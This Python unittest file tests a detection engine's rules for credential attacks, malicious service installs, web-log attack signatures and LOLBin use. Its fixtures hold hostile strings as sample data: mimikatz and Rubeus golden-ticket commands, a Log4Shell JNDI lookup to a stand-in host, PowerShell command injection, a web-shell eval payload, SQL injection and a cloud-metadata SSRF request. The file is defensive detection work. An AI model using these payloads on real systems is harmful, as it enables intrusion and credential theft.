from __future__ import annotations

# ruff: noqa: E402
#
# Regression coverage for detection-rule accuracy / false-positive reduction:
#   * keyword-only signatures (golden ticket, BloodHound) must require real attack
#     context instead of firing on benign prose / URLs that merely contain the word;
#   * Event 7045 must only produce a finding for a *suspicious* service install, not
#     for every routine software/driver service;
#   * scanner signatures live in the User-Agent header, not the request line;
#   * a couple of broad web request substrings are anchored to a boundary/context.

import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest.mock import patch


class _BaseModel:
    def __init__(self, **kwargs):
        for key, value in kwargs.items():
            setattr(self, key, value)

    @classmethod
    def model_validate(cls, data):
        return cls(**data)

    def model_dump_json(self, indent=None):
        return "{}"


sys.modules.setdefault("keyring", types.SimpleNamespace(
    get_password=lambda *_a, **_k: None,
    set_password=lambda *_a, **_k: None,
    delete_password=lambda *_a, **_k: None,
    errors=types.SimpleNamespace(PasswordDeleteError=Exception),
))
sys.modules.setdefault("pydantic", types.SimpleNamespace(
    BaseModel=_BaseModel,
    Field=lambda default=None, default_factory=None, **_k: default_factory() if default_factory else default,
))

from sqlalchemy import select
from app.detect import engine
from app.store import cases
from app.store import database
from app.store.database import Finding, Process


class _CaseTestBase(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
        ]
        for p in self.patches:
            p.start()

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        for p in reversed(self.patches):
            p.stop()
        self.tmp.cleanup()

    def _run(self, seed) -> list[tuple[str, str]]:
        """Seed a case, run detections, return (title, severity) for every finding."""
        case = cases.create_case("acc")
        s = cases.get_session(case["id"])
        try:
            seed(s)
            s.commit()
        finally:
            s.close()
        engine.run_detections_sync(case["id"])
        s = cases.get_session(case["id"])
        try:
            return [(f.title, f.severity) for f in s.scalars(select(Finding))]
        finally:
            s.close()


class KeywordContextTests(unittest.TestCase):
    """Keyword-only signatures must not fire on benign text that merely contains the word."""

    def test_golden_ticket_phrase_alone_is_benign(self) -> None:
        for benign in (
            "get /promos/golden-ticket-2024 winner -> 200",
            "willy wonka golden ticket giveaway",
            "your golden ticket to the finals",
        ):
            self.assertIsNone(
                engine._scan_cmdline_severity(benign),
                f"{benign!r} should not match a golden-ticket rule",
            )

    def test_golden_ticket_with_attack_context_fires(self) -> None:
        for mal in (
            "invoke-mimikatz golden ticket /krbtgt:...",
            "rubeus.exe golden /aes256:deadbeef ...  (golden ticket)",
            "mimikatz # kerberos::golden /user:administrator",
        ):
            self.assertEqual(engine._scan_cmdline_severity(mal), "critical", mal)

    def test_bloodhound_word_alone_is_benign(self) -> None:
        for benign in (
            "my bloodhound is a great tracking dog",
            "the bloodhound gang played last night",
        ):
            self.assertIsNone(engine._scan_cmdline_severity(benign), benign)

    def test_bloodhound_tool_invocation_fires(self) -> None:
        for mal in (
            "invoke-bloodhound -collectionmethod all",
            "bloodhound.exe --zip",
            "bloodhound-python -d corp.local -c all",
            "sharphound.exe -c all",
        ):
            self.assertEqual(engine._scan_cmdline_severity(mal), "high", mal)


class ServiceInstallTests(_CaseTestBase):
    def _svc_event(self, s, name, image, channel="System"):
        cases.add_event(
            s, timestamp=None, host="h", source="System.evtx", category="event",
            entity=name, severity="info",
            summary=f"A service was installed: {name} ({image})",
            raw={"EventID": "7045", "Channel": channel,
                 "ServiceName": name, "ImagePath": image},
        )

    def test_routine_service_install_is_not_a_finding(self) -> None:
        def seed(s):
            self._svc_event(s, "MyVendorSvc", r"C:\Program Files\MyVendor\svc.exe")
            self._svc_event(s, "dhcp", r"C:\Windows\system32\svchost.exe -k netsvcs")
        titles = [t for t, _ in self._run(seed)]
        self.assertNotIn("New service installed", titles)

    def test_single_suspicious_property_is_low(self) -> None:
        # One suspicious property (staging path) is a weak signal on its own -> low.
        def seed(s):
            self._svc_event(s, "Updater", r"C:\Users\v\AppData\Local\Temp\a.exe")
        found = [(t, sev) for t, sev in self._run(seed) if t == "New service installed"]
        self.assertEqual(found, [("New service installed", "low")])

    def test_two_suspicious_properties_are_medium(self) -> None:
        # Staging path *and* a machine-generated name -> two reasons -> medium.
        def seed(s):
            self._svc_event(s, "a1b2", r"C:\Users\v\AppData\Local\Temp\a1b2.exe")
        found = [(t, sev) for t, sev in self._run(seed) if t == "New service installed"]
        self.assertEqual(found, [("New service installed", "medium")])

    def test_random_short_name_with_digit_is_flagged(self) -> None:
        def seed(s):
            self._svc_event(s, "a1b2", r"C:\Windows\a1b2.exe")
        found = [t for t, _ in self._run(seed) if t == "New service installed"]
        self.assertEqual(found, ["New service installed"])


class WeblogTests(_CaseTestBase):
    def _web_event(self, s, request, ua="Mozilla/5.0", status="200"):
        cases.add_event(
            s, timestamp=None, host="web", source="access.log", category="weblog",
            entity="203.0.113.7", severity="info",
            summary="web request",
            raw={"client_ip": "203.0.113.7", "request": request,
                 "status": status, "user_agent": ua},
        )

    def _web_titles(self, request, ua="Mozilla/5.0"):
        def seed(s):
            self._web_event(s, request, ua)
        return [t for t, _ in self._run(seed)]

    def test_scanner_in_user_agent_is_detected(self) -> None:
        titles = self._web_titles("GET / HTTP/1.1", ua="Mozilla/5.0 sqlmap/1.7#stable")
        self.assertIn("Web attack: sqlmap scanner user-agent", titles)

    def test_scanner_name_in_url_only_does_not_fire(self) -> None:
        # A benign path that happens to contain a tool name must not be flagged now
        # that scanner detection keys off the User-Agent header.
        titles = self._web_titles("GET /blog/nmap-tutorial-for-beginners HTTP/1.1")
        self.assertEqual([t for t in titles if t.startswith("Web attack")], [])

    def test_powershell_injection_context_required(self) -> None:
        benign = self._web_titles("GET /docs/powershell-cheatsheet HTTP/1.1")
        self.assertEqual([t for t in benign if "PowerShell" in t], [])
        malicious = self._web_titles("GET /run?host=1.2.3.4;powershell+-enc+ZgBv HTTP/1.1")
        self.assertIn("Web attack: Command injection (PowerShell)", malicious)

    def test_eval_is_boundary_anchored(self) -> None:
        benign = self._web_titles("GET /catalog/retrieval(item) HTTP/1.1")
        self.assertEqual([t for t in benign if "eval()" in t], [])
        malicious = self._web_titles("POST /upload?x=eval(base64_decode($_POST)) HTTP/1.1")
        self.assertIn("Web attack: Web shell eval() payload", malicious)

    def test_sql_injection_still_fires(self) -> None:
        titles = self._web_titles("GET /p?id=1 union select password from users HTTP/1.1")
        self.assertIn("Web attack: SQL injection (UNION SELECT)", titles)


class NewWebAttackTests(_CaseTestBase):
    """The expanded exploitation / disclosure / SSRF web signatures fire, and a couple
    of benign near-misses stay quiet."""

    def _web_titles(self, request, ua="Mozilla/5.0"):
        def seed(s):
            cases.add_event(
                s, timestamp=None, host="web", source="access.log", category="weblog",
                entity="203.0.113.9", severity="info", summary="web request",
                raw={"client_ip": "203.0.113.9", "request": request, "status": "200",
                     "user_agent": ua},
            )
        return [t for t, _ in self._run(seed)]

    def test_new_exploit_signatures_fire(self) -> None:
        cases_map = {
            "GET /?x=${jndi:ldap://evil/a} HTTP/1.1": "Log4Shell JNDI injection (${jndi:})",
            "GET /latest/meta-data/ HTTP/1.1 Host: 169.254.169.254": "SSRF to cloud metadata endpoint",
            "GET /.git/config HTTP/1.1": "Exposed .git repository access",
            "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1": "PHPUnit eval-stdin RCE (CVE-2017-9841)",
        }
        for request, desc in cases_map.items():
            titles = self._web_titles(request)
            self.assertIn(f"Web attack: {desc}", titles, request)

    def test_benign_paths_do_not_fire_new_rules(self) -> None:
        for benign in ("GET /.github/workflows/ci.yml HTTP/1.1",
                       "GET /environment/status HTTP/1.1"):
            titles = [t for t in self._web_titles(benign) if t.startswith("Web attack")]
            self.assertEqual(titles, [], benign)


class LolbinSeverityTests(_CaseTestBase):
    def _proc(self, s, name, cmdline):
        s.add(Process(
            pid=1000 + len(name), ppid=None, name=name,
            path=f"C:\\Windows\\System32\\{name}", cmdline=cmdline,
            session_id="live", flags=[], severity="info",
        ))

    def test_everyday_lolbins_are_low_signal(self) -> None:
        def seed(s):
            self._proc(s, "msiexec.exe", "msiexec.exe /i C:\\pkg\\app.msi /qn")
            self._proc(s, "curl.exe", "curl.exe https://example.com/a -o a")
        findings = {t: sev for t, sev in self._run(seed) if t.startswith("LOLBin")}
        self.assertEqual(findings.get("LOLBin activity: msiexec.exe"), "low")
        self.assertEqual(findings.get("LOLBin activity: curl.exe"), "low")

    def test_higher_signal_lolbin_stays_medium(self) -> None:
        def seed(s):
            self._proc(s, "mshta.exe", "mshta.exe C:\\x\\a.hta")
        findings = {t: sev for t, sev in self._run(seed) if t.startswith("LOLBin")}
        self.assertEqual(findings.get("LOLBin activity: mshta.exe"), "medium")


if __name__ == "__main__":
    unittest.main()
